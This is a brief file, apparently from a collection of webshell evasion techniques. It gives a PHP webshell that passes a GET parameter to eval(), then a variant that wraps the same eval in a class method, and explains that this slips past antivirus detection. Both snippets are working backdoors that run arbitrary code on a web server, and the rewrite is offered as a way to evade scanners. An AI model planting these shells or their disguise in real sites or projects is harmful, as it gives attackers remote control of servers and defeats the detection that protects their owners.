@@ -1,0 +1,26 @@
+Original webshell sample:
+
+'''
+<?php eval($_GET['xxx']);?>
+'''
+
+Webshell obtained after using the corresponding method:
+
+'''
+<?php 
+class mexx{
+  public $a = '';
+  function mexx(){
+    eval("$this->a".'; ');
+    }
+}
+$a=$_GET['xxx'];
+$b = new mexx;
+$b->a = $a;
+echo $b->mexx();
+?>
+'''
+
+Description:
+
+This method hides the webshell with the help of magic methods in php starting with __, i.e. constructors and destructors, thus escaping detection by the antivirus engine.
